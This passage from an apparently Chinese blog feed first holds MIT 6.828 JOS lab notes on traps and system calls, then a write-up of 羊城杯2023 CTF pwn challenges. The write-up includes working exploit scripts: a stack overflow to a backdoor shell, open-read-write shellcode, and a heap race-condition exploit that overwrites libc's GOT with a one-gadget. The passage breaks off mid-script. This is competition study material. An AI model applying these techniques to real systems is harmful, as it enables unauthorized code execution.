case.</span><br><span class="line"> */</span><br><span class="line">#define TRAPHANDLER_NOEC(name, num)\</span><br><span class="line">.globl name;\</span><br><span class="line">.type name, @function;\</span><br><span class="line">.align 2;\</span><br><span class="line">name:\</span><br><span class="line">pushl $0;\</span><br><span class="line">pushl $(num);\</span><br><span class="line">jmp _alltraps</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(divide_handler, T_DIVIDE);</span><br><span class="line">//......</span><br><span class="line">//其他中断定义方式相同,这里省略了</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Lab 3: Your code here for _alltraps</span><br><span class="line"> */</span><br><span class="line">.global _alltraps</span><br><span class="line">_alltraps:</span><br><span class="line">pushl %ds;</span><br><span class="line">pushl %es;</span><br><span class="line">pushal;</span><br><span class="line"></span><br><span class="line">movw $GD_KD,%ax;</span><br><span class="line">movw %ds,%ax;</span><br><span class="line">movw %es,%ax;</span><br><span class="line"></span><br><span class="line">pushl %esp;</span><br><span class="line">call trap;</span><br></pre></td></tr></tbody></table></figure><p>下面是Trapframe结构的定义,由注释分为三个部分,<br>最下面的一部分仅在发生特权级切换的时候才压入.<br>下图中的Trapframe部分在发生异常时由处理器硬件压入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310030006345.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> {</span></span><br><span class="line"><span class="comment">/* registers as pushed by pusha */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_edi;</span><br><span class="line"><span class="type">uint32_t</span> reg_esi;</span><br><span class="line"><span class="type">uint32_t</span> reg_ebp;</span><br><span class="line"><span class="type">uint32_t</span> reg_oesp;<span class="comment">/* Useless */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_ebx;</span><br><span class="line"><span class="type">uint32_t</span> reg_edx;</span><br><span class="line"><span class="type">uint32_t</span> reg_ecx;</span><br><span class="line"><span class="type">uint32_t</span> reg_eax;</span><br><span class="line">} __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line"><span class="type">uint16_t</span> tf_es;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding1;</span><br><span class="line"><span class="type">uint16_t</span> tf_ds;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding2;</span><br><span class="line"><span class="type">uint32_t</span> tf_trapno;</span><br><span class="line"><span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line"><span class="type">uint32_t</span> tf_err;</span><br><span class="line"><span class="type">uintptr_t</span> tf_eip;</span><br><span class="line"><span class="type">uint16_t</span> tf_cs;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding3;</span><br><span class="line"><span class="type">uint32_t</span> tf_eflags;</span><br><span class="line"><span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line"><span class="type">uintptr_t</span> tf_esp;</span><br><span class="line"><span class="type">uint16_t</span> tf_ss;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding4;</span><br><span class="line">} __attribute__((packed));</span><br></pre></td></tr></tbody></table></figure><h5 id="trap流程分析"><a href="#trap流程分析" class="headerlink" title="trap流程分析"></a>trap流程分析</h5><p>i386_init中调用trap_init完成trap的初始化:将各中断处理例程(在本实现中是中断处理例程的入口点)挂接到IDT中,设置TSS段(存储了内核栈的地址信息)并挂接到GDT中,设置IDT和TSS.</p><p>当中断或异常发生,处理器根据中断向量号在IDT中寻找对应的中断处理例程,在进行特权级检查(中断处理例程DPL≤CPL≤中断门描述符DPL)后,若发生特权级转换,CPU从当前TSS段中取出内核栈的地址信息(ss,esp)并加载到ss,esp寄存器中(加载前临时保存原值).在内核栈中压入原栈地址,再压入CS和eip,跳转到中断处理例程.接下来由操作系统(而不是处理器)压入错误码(是否压入因异常而异)及其他寄存器信息,形成Trapframe结构.跳转到trap函数.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// The environment may have set DF and some versions</span></span><br><span class="line"><span class="comment">// of GCC rely on DF being clear</span></span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">"cld"</span> ::: <span class="string">"cc"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that interrupts are disabled.  If this assertion</span></span><br><span class="line"><span class="comment">// fails, DO NOT be tempted to fix it by inserting a "cli" in</span></span><br><span class="line"><span class="comment">// the interrupt path.</span></span><br><span class="line">assert(!(read_eflags() &amp; FL_IF));</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"Incoming TRAP frame at %p\n"</span>, tf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">3</span>) {</span><br><span class="line"><span class="comment">// Trapped from user mode.</span></span><br><span class="line">assert(curenv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy trap frame (which is currently on the stack)</span></span><br><span class="line"><span class="comment">// into 'curenv-&gt;env_tf', so that running the environment</span></span><br><span class="line"><span class="comment">// will restart at the trap point.</span></span><br><span class="line">curenv-&gt;env_tf = *tf;</span><br><span class="line"><span class="comment">// The trapframe on the stack should be ignored from here on.</span></span><br><span class="line">tf = &amp;curenv-&gt;env_tf;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Record that tf is the last real trapframe so</span></span><br><span class="line"><span class="comment">// print_trapframe can print some additional information.</span></span><br><span class="line">last_tf = tf;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dispatch based on what type of trap occurred</span></span><br><span class="line">trap_dispatch(tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return to the current environment, which should be running.</span></span><br><span class="line">assert(curenv &amp;&amp; curenv-&gt;env_status == ENV_RUNNING);</span><br><span class="line">env_run(curenv);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>trap函数进一步根据中断向量号分发(trap_dispatch)到各真正的中断处理例程(本实现中IDT中保存的只是一个中断处理例程的entry).<br>完成异常处理后,调用env_run函数恢复原环境(进程).</p><h3 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls"><a href="#Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls" class="headerlink" title="Part B: Page Faults, Breakpoints Exceptions, and System Calls"></a>Part B: Page Faults, Breakpoints Exceptions, and System Calls</h3><h4 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h4><p>调试器执行的原理:临时替换断点处的1字节指令为int 3系统调用触发The Breakpoint Exception.在这里的实现中会调用内核监视器monitor,添加两个命令nextstep和continue,前者会修改eflags的FL_TF位使处理器开始单步执行,每次执行完成发出一个中断号为1的debug exception,在本实现中该异常处理例程同样会启动monitor.</p><blockquote><p>The breakpoint exception, interrupt vector 3 (T_BRKPT), is normally used to allow debuggers to insert breakpoints in a program’s code by temporarily replacing the relevant program instruction with the special 1-byte int3 software interrupt instruction.</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_nextstep</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(!tf)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"empty Trapframe"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"$rip: %p\n"</span>,tf-&gt;tf_eip);</span><br><span class="line"><span class="keyword">switch</span>(tf-&gt;tf_trapno)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">case</span> T_BRKPT:</span><br><span class="line">tf-&gt;tf_eflags |= FL_TF;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> T_DEBUG:</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_eflags &amp; FL_TF)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">cprintf(<span class="string">"nextstep(ni) can only called via int 3(breakpoint exception)\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_continue</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(!tf)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"empty Trapframe"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(tf-&gt;tf_trapno==T_DEBUG||tf-&gt;tf_trapno==T_BRKPT)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_eflags &amp; FL_TF) </span><br><span class="line">{</span><br><span class="line">            tf-&gt;tf_eflags &amp;= ~FL_TF;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">"continue can only called via breakpoint or debug exception!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="System-calls-系统调用"><a href="#System-calls-系统调用" class="headerlink" title="System calls 系统调用"></a>System calls 系统调用</h4><p>注意权限位的检验采用(perm&amp;(*pte))==perm的形式,想象一下交集便于理解这一操作.(一些类型转换使程序看起来很乱,ye..i know…)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">user_mem_check</span><span class="params">(<span class="keyword">struct</span> Env *env, <span class="type">const</span> <span class="type">void</span> *va, <span class="type">size_t</span> len, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="type">uintptr_t</span> start_va = ROUNDDOWN((<span class="type">uintptr_t</span>)va,PGSIZE);</span><br><span class="line"><span class="type">uintptr_t</span> end_va = ROUNDUP((<span class="type">uintptr_t</span>)(va+len),PGSIZE);</span><br><span class="line"><span class="type">pte_t</span>* pte;</span><br><span class="line"><span class="keyword">for</span>(;start_va&lt;end_va;start_va+=PGSIZE)</span><br><span class="line">{</span><br><span class="line">pte = pgdir_walk(env-&gt;env_pgdir,(<span class="type">void</span>*)start_va,<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span>(start_va&gt;=ULIM||pte==<span class="literal">NULL</span>||!(*pte&amp;PTE_P)||((perm&amp;(*pte))!=perm))</span><br><span class="line">{</span><br><span class="line">user_mem_check_addr = start_va&gt;(<span class="type">uintptr_t</span>)va?start_va:(<span class="type">uintptr_t</span>)va;</span><br><span class="line"><span class="keyword">return</span> -E_FAULT;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="syscall流程分析"><a href="#syscall流程分析" class="headerlink" title="syscall流程分析"></a>syscall流程分析</h5><p>用户进程调用sys_xxx函数(其实用户并不直接调用这样的函数,而是由更上一层的函数如cprintf之类的调用.<del>这里的用户指的是使用JOS而不是开发JOS的开发者hh</del>),向操作系统申请xxx的操作,sys_xxx函数调用syscall函数,syscall函数使用int 0x30触发中断.<br>(上述sys_xxx,syscall函数均为lib/syscall.c中定义的由用户进程使用的函数,而非kern/syscall.c中的内核使用的实现)</p><p>中断处理过程参考上面的trap流程分析.<br>最终被分发到内核的syscall函数,该函数通过调用相应的内核函数完成功能,并设置系统调用返回值,之后正常从中断返回到用户进程.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2023 复现</title>
      <link href="/2023/ycb2023/"/>
      <url>/2023/ycb2023/</url>
      
        <content type="html"><![CDATA[<p>heap没出没进线下…</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>qemu-riscv64 -g 2333 ./pwn<br>gdbinit这样设置方便调试,然后gdb-multiarch -x gdbinit就能调了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set arch riscv:rv64</span><br><span class="line">target remote 127.0.0.1:2333</span><br><span class="line">define hook-stop</span><br><span class="line">    info reg</span><br><span class="line">    echo "\n\n\n\n\n"</span><br><span class="line">    x/10i $pc</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b *0x123457EA</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure><span id="more"></span><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281240372.png"></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>main函数,一次向unk_12347078读入8字节,一次向栈上读入最多0x120字节,没有溢出.之后跳转到sub_12345786函数,即vuln.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281230369.png"><br>vuln函数:<br>调用strlen函数检查之前在main函数中第二次输入的数据长度是否小于8,这里有个andi a4,a5,0xFF的操作,即只取了strlen结果的低8位,则0x108被转换成0x8,完成绕过.而返回地址恰好存储在strcpy(dest,source)的dest+0x100的地方,正好可以覆盖.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281229972.png"><br>还有个后门函数不过有过滤,可以直接跳到这个位置绕过过滤.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309281239787.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x100</span></span><br><span class="line">backdoor = <span class="number">0x12345770</span></span><br><span class="line">payload = <span class="string">b"a"</span>*offset + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'name:'</span>, <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">io.sendafter(<span class="string">b'words'</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>有个offbynull,第17个字节没有限制可以输入ret的字节码.<br>第一次输入时输入syscall的字节码,第二次输入shellcode利用栈上数据布置read的参数.第三次正式读入orw的shellcode,dup2改一下fd.<br>偷搬wp.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b'[2] Input: (ye / no)\n'</span>, <span class="string">b'\x0f\x05'</span>) <span class="comment"># syscall</span></span><br><span class="line">sc = <span class="string">'''</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push rbx </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">shellcode= asm(sc)</span><br><span class="line">sa(<span class="string">b'======== Input Your P0P Code ========'</span>, shellcode)</span><br><span class="line">sc = <span class="string">'''</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x200000000</span></span><br><span class="line"><span class="string">mov rax, 0x21</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 2</span></span><br><span class="line"><span class="string">mov rax, 0x21</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,2</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 90</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0x200000000</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload = (<span class="number">0x48</span> + <span class="number">2</span>) * <span class="string">b'a'</span> + asm(sc)</span><br><span class="line">s(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>大概逻辑是主函数读取输入,根据输入开启单独线程进行相应的堆操作.<br>注意下输入的格式.</p><p>看了很久没找到洞.由于处理输入是在单独的线程中,考虑过条件竞争,但否定了,当时的理由是:<br>    “开启一个线程1后,线程1开始简单逻辑,主线程回到fgets阻塞等待IO,待结束阻塞后才开启线程2,由于IO操作,程序正常运行情况下线程2一定是在线程1完成逻辑并结束后再开启的,不会存在竞争现象.”</p><p>看了其他师傅的wp才发现edit函数中有个sleep(1)….ok那就竞争吧.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291610316.png"><br>相关调试命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = '''</span><br><span class="line">set scheduler-locking on</span><br><span class="line">breakrva 0x1955</span><br><span class="line">c</span><br><span class="line">breakrva 0x14f8</span><br><span class="line">c</span><br><span class="line">'''</span><br></pre></td></tr></tbody></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>既然edit会sleep(1),那就在edit等待的时候替换掉全局变量里的堆块指针,指向一个更小的chunk,在本题中便可制造一个0x18字节的堆溢出.glibc2.35的0x18字节堆溢出,想想都麻烦,不过好在这题的特殊结构,可以覆盖content_ptr制造一个任意地址读写.<br>好在main函数能正常退出,可以直接改返回地址了.<br>发现libc只是partial relro,可以改下got表,我exp是直接改onegadget了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291616663.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309301605803.png"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>具体有点麻烦的,多调调吧,主要就是memncpy会用\0填满n字节,然后我们又要用一次部分覆写…<br>这libc的environ末尾还是00…<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309291936629.png"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content:<span class="built_in">bytes</span></span>):</span><br><span class="line">    payload = <span class="string">b'1 '</span></span><br><span class="line">    payload += content</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    payload = <span class="string">b'2 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    payload = <span class="string">b'3 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()+<span class="string">b':'</span>+content</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    payload = <span class="string">b'4 '</span></span><br><span class="line">    payload += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    payload = <span class="string">b'5 '</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    payload = <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x62</span>)<span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b'a'</span>*<span class="number">0x60</span>+<span class="string">b'\xa0\x08'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b'b'</span>*<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">'paper index: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0x198db0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(libc_base).startswith(<span class="string">"0x7f"</span>):</span><br><span class="line">    <span class="keyword">raise</span> EOFError</span><br><span class="line"></span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b'a'</span>*<span class="number">0x60</span>+p64(libc_base+<span class="number">0x219098</span>))<span class="comment">#libc.got['strlen']</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b'a'</span>*<span class="number">0x50</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b'k'</span>*<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">sleep(<span 